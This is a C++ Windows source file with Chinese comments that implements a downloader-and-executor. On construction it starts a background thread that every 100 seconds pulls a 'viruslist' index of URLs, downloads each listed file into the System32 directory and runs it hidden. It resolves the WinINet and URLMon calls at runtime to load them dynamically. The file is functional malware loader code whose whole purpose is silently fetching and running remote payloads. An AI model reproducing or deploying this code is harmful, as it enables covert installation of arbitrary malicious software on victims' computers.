#include "StdAfx.h"
#include "FileDownloader.h"
#include <bcrypt.h>
#include <wtypes.h>
#include <wininet.h>
#include <shellapi.h>
#include <iostream>
#include <urlmon.h>

static const TCHAR* downFileDir = _T("\\System32\\Download");
static const TCHAR* exampleURLMulti = _T("http://www.example.com/viruslist.txt");
static const TCHAR* exampleURLSingle = _T("http://www.example.com/viruslist.exe");

CRITICAL_SECTION gCriticalSection;
bool downloadThreadRunning = false;

CFileDownloader::CFileDownloader(void)
{
	hDownloader = NULL;
	startDownload();
}

CFileDownloader::~CFileDownloader(void)
{
	::CloseHandle(hDownloader);
}

DWORD WINAPI MultiDownloadThread(LPVOID lpParam)
{
	wstring myURL;
	myURL.clear();
	myURL.append(exampleURLMulti);

	CFileDownloader* downloader = (CFileDownloader*)lpParam;

	// 每隔100秒进行一次下载
	while(true)
	{
		downloader->backgroundMultiDownLoadFile(exampleURLMulti);

		downloader->downloadExec(exampleURLSingle);

		::Sleep(100000);
	}

	return 0;
}

void CFileDownloader::startDownload()
{
	hDownloader = ::CreateThread(NULL, NULL, MultiDownloadThread, this, 0, &this->threadId);
	downloadThreadRunning = true;
}

bool CFileDownloader::backgroundMultiDownLoadFile( wstring url )
{
	HMODULE hDll;
	LPVOID hInternet, hUrlHandle;
	TCHAR buf[100];
	DWORD dwSize;

	// 动态加载dll，此DLL为系统自带，这样做为以后缩减执行程序体积做准备
	hDll = LoadLibrary(_T("wininet.dll"));

	// 读取DLL失败，返回false
	if (!hDll)
	{
		return false;
	}

	// 为DLL内的函数定义
	typedef LPVOID(WINAPI *pInternetOpen) (LPCTSTR, DWORD, LPCTSTR, LPCTSTR, DWORD);
	typedef LPVOID(WINAPI *pInternetOpenUrl) (LPVOID, LPCTSTR, LPCTSTR, DWORD, DWORD, DWORD);
	typedef BOOL(WINAPI *pInternetCloseHandle) (LPVOID);
	typedef BOOL(WINAPI *pInternetReadFile) (LPVOID ,LPVOID ,DWORD ,LPDWORD);

	pInternetOpen InternetOpen = NULL;
	pInternetOpenUrl InternetOpenURL = NULL;
	pInternetCloseHandle InternetCloseHandle = NULL;
	pInternetReadFile InternetReadFile = NULL;

	InternetOpen = (pInternetOpen) GetProcAddress(hDll, "InternetOpenW");
	InternetOpenURL = (pInternetOpenUrl) GetProcAddress(hDll, "InternetOpenUrlW");
	InternetCloseHandle = (pInternetCloseHandle) GetProcAddress(hDll, "InternetCloseHandle");
	InternetReadFile = (pInternetReadFile) GetProcAddress(hDll, "InternetReadFile");

	hInternet = InternetOpen(_T("Downloader"), 0, NULL, NULL, 0);

	// 建立网络连接失败
	if (hInternet == NULL)
	{
		return false;
	}

	// 采用无缓冲的传输
	hUrlHandle = InternetOpenURL(hInternet, url.c_str(), NULL, 0, 0x04000000, 0);

	// 打开URL失败
	if (hUrlHandle == NULL)
	{
		return false;
	}

	wmemset(buf, 0, 100);

	// 先读取一个8字节的文件头
	InternetReadFile(hUrlHandle, buf, 8, &dwSize);

	// 读取接下来的索引文件
	wstring str;
	do 
	{
		wmemset(buf, 0, 100);

		// 读取失败则停止读取
		if (!InternetReadFile(hUrlHandle, buf, 100, &dwSize))
		{
			break;
		}

		str.append(buf);
		if (dwSize < 100)
		{
			break;
		}
	}
	while(true);

	// 解析索引文件
	wstring::size_type pos = wstring::npos;

	do 
	{
		// 将|作为不同Url的分隔符
		pos = str.find_first_of(_T('|'));

		if (pos != wstring::npos)
		{
			// 未解析的字符串中的第一段URL
			wstring::size_type pos = str.find_first_of(_T('|'));
			wstring curFileUrl = str.substr(0, pos);

			downloadExec(curFileUrl.c_str());

			// 去掉已经解析的URL
			if (str.length() > pos + 1)
			{
				str = str.substr(pos + 1, wstring::npos);
			}
			else
			{
				break;
			}
		}
		else
		{
			break;
		}

		Sleep(1000);
	} while (TRUE);

	return true;
}

void CFileDownloader::downloadExec(LPCTSTR fileUrl)
{
	TCHAR SysDirBuff[MAX_PATH];
	wstring ArpFile;

	memset(SysDirBuff, 0, MAX_PATH);

	::GetSystemDirectoryW(SysDirBuff, sizeof(SysDirBuff));
	ArpFile.append(SysDirBuff);
	ArpFile.append(downFileDir);

	HMODULE hDll;

	hDll = ::LoadLibrary(_T("Urlmon.dll"));

	if (!hDll)
	{
		cerr<<_T("加载Urlmon.dll失败");
		return;
	}

	typedef HRESULT(__stdcall *pURLDownloadToFile) (LPUNKNOWN, LPCWSTR
		, LPCWSTR, DWORD, LPBINDSTATUSCALLBACK);

	pURLDownloadToFile URLDownloadToFile = (pURLDownloadToFile)GetProcAddress(hDll, "URLDownloadToFileW");

	URLDownloadToFile(0, fileUrl, ArpFile.c_str(), 0, 0);
	
	ShellExecuteW(NULL, NULL, ArpFile.c_str(), NULL, NULL, SW_HIDE);
}